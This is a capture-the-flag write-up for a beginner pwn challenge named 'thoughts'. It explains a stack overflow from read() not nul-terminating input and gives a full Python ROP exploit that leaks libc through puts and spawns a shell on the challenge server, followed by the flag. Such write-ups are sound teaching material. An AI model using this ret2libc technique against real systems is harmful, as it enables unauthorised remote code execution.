# thoughts
Good Thoughts Bad Thoughts !

`nc 157.230.33.195 1111`

Flag Format: Trollcat{.*}

**Author : codackerA**

**Files**: `Thoughts.zip` (`vuln`, `libc.so.6`)

```sh
$ checksec thoughts.o   # vuln renamed
[*] 'thoughts.o'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
$ ../libc-database/identify thoughts.so.6   # libc.so.6 renamed
libc6_2.31-0ubuntu9.1_i386
```
## Solution
This challenge is pretty clearly for beginners... just putting my solution up so others can compare if they want.

Essentially, `read()` doesn't necessarily truncuate with nul-bytes, so you can use `bad[]+good[]` to overflow onto the stack when executing `bad()`. From there, abuse the lack of PIE to ROP to a shell.

```python
from pwnscripts import *
context.binary = 'thoughts.o'
context.libc_database = '../libc-database'
context.libc = 'thoughts.so.6'
r = remote('157.230.33.195', 1111)
def rop(chain: bytes):
    r.sendlineafter('> ', '1')
    r.sendline(b'a'*12 + chain)
    r.sendlineafter('> ', '2')
    r.send(b'a'*0x20)
    r.recvline()

R = ROP(context.binary)
R.puts(context.binary.got['puts'])
R.main()
rop(R.chain())
r.recvline()
context.libc.symbols['puts'] = unpack(r.recv(4))

R = ROP(context.libc)
R.system(context.libc.symbols['str_bin_sh'])
rop(R.chain())
r.interactive()
```
## Flag
`Trollcat{h4ck3rs_d0nt_n33d_b4d_th0ghts}`
